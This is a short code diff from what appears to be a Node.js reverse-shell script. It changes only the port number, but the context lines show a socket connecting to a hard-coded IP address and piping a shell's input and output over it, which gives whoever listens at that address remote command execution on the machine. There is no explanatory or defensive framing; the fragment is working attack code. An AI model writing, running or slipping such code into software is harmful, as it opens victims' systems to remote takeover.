@@ -5,7 +5,7 @@
 
     var client = new net.Socket()
     var IP = "172.16.144.129"
-    client.connect(8080, IP, function(){
+    client.connect(1234, IP, function(){
 
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
